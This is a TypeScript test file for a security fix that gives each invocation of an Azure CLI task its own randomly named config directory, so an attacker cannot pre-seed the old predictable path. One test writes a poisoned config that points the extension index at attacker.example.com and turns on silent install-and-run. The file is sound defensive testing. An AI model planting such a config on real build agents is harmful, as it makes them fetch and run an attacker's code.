import assert = require('assert');
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import { createPerInvocationAzureConfigDir, removePerInvocationAzureConfigDir } from '../src/AzureCliConfigDir';

export function runConfigDirIsolationTests() {
    describe('createPerInvocationAzureConfigDir (security hardening)', () => {
        let agentTemp: string;

        beforeEach(() => {
            agentTemp = fs.mkdtempSync(path.join(os.tmpdir(), 'azcli-agenttmp-'));
        });

        afterEach(() => {
            try { fs.rmSync(agentTemp, { recursive: true, force: true }); } catch { /* ignore */ }
        });

        it('creates a brand-new directory under the agent temp root', () => {
            const dir = createPerInvocationAzureConfigDir(agentTemp);
            try {
                assert(fs.existsSync(dir), 'config dir should exist on disk');
                assert(fs.statSync(dir).isDirectory(), 'should be a directory');
                assert(path.dirname(dir) === fs.realpathSync(agentTemp) || path.dirname(dir) === agentTemp,
                    `config dir parent should be agent temp, got ${path.dirname(dir)}`);
            } finally {
                fs.rmSync(dir, { recursive: true, force: true });
            }
        });

        it('does NOT use the predictable ".azclitask" path that the vulnerable code used', () => {
            const vulnerablePath = path.join(agentTemp, '.azclitask');
            const dir = createPerInvocationAzureConfigDir(agentTemp);
            try {
                assert.notStrictEqual(dir, vulnerablePath,
                    'must not use the fixed predictable path attackable by pre-seeding');
                assert(path.basename(dir).startsWith('.azclitask-'),
                    `basename should start with ".azclitask-" (got "${path.basename(dir)}")`);
                assert(path.basename(dir).length > '.azclitask-'.length,
                    'mkdtemp must append a random suffix');
            } finally {
                fs.rmSync(dir, { recursive: true, force: true });
            }
        });

        it('produces a different directory on each invocation', () => {
            const a = createPerInvocationAzureConfigDir(agentTemp);
            const b = createPerInvocationAzureConfigDir(agentTemp);
            try {
                assert.notStrictEqual(a, b, 'two invocations must yield distinct dirs');
            } finally {
                fs.rmSync(a, { recursive: true, force: true });
                fs.rmSync(b, { recursive: true, force: true });
            }
        });

        it('ignores an attacker-pre-seeded ".azclitask/config" in the agent temp', () => {
            // Simulate the exact attack: a prior step writes a poisoned config at the
            // predictable path the vulnerable task used to point AZURE_CONFIG_DIR at.
            const poisonedDir = path.join(agentTemp, '.azclitask');
            fs.mkdirSync(poisonedDir, { recursive: true });
            const poisonedConfig = path.join(poisonedDir, 'config');
            fs.writeFileSync(poisonedConfig,
                '[extension]\nindex_url = https://attacker.example.com/index.json\n' +
                'use_dynamic_install = yes_without_prompt\n' +
                'run_after_dynamic_install = True\n');

            const dir = createPerInvocationAzureConfigDir(agentTemp);
            try {
                assert.notStrictEqual(dir, poisonedDir,
                    'new config dir must not be the attacker-controlled predictable path');
                assert(!fs.existsSync(path.join(dir, 'config')),
                    'newly-created config dir must not contain a pre-seeded config file');
            } finally {
                fs.rmSync(dir, { recursive: true, force: true });
            }
        });

        it('throws when agentTempDir is empty/undefined', () => {
            assert.throws(() => createPerInvocationAzureConfigDir(undefined as any));
            assert.throws(() => createPerInvocationAzureConfigDir(''));
        });
    });

    describe('removePerInvocationAzureConfigDir', () => {
        let agentTemp: string;

        beforeEach(() => {
            agentTemp = fs.mkdtempSync(path.join(os.tmpdir(), 'azcli-agenttmp-'));
        });

        afterEach(() => {
            try { fs.rmSync(agentTemp, { recursive: true, force: true }); } catch { /* ignore */ }
            delete process.env['AZURE_CONFIG_DIR'];
        });

        it('removes the directory (even when it contains files left by az)', () => {
            const dir = createPerInvocationAzureConfigDir(agentTemp);
            fs.writeFileSync(path.join(dir, 'config'), '[extension]\nindex_url = x\n');
            fs.mkdirSync(path.join(dir, 'cliextensions'));
            process.env['AZURE_CONFIG_DIR'] = dir;
            removePerInvocationAzureConfigDir(dir);
            assert(!fs.existsSync(dir), 'directory must be gone after cleanup');
            assert(process.env['AZURE_CONFIG_DIR'] === undefined,
                'AZURE_CONFIG_DIR env var must be unset after cleanup');
        });

        it('is a no-op for null/empty inputs (safe in finally)', () => {
            assert.doesNotThrow(() => removePerInvocationAzureConfigDir(null));
            assert.doesNotThrow(() => removePerInvocationAzureConfigDir(undefined));
            assert.doesNotThrow(() => removePerInvocationAzureConfigDir(''));
        });

        it('never throws when the path does not exist', () => {
            const ghost = path.join(agentTemp, '.azclitask-ghost00');
            assert(!fs.existsSync(ghost));
            assert.doesNotThrow(() => removePerInvocationAzureConfigDir(ghost));
        });
    });
}
